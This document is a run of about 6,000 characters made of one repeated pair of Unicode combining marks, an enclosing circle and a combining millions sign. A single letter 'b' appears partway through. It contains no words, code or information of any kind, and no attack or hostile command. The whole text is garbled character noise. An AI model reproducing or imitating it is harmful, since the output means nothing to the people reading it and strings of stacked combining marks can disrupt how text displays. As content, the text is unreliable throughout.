⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉b҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉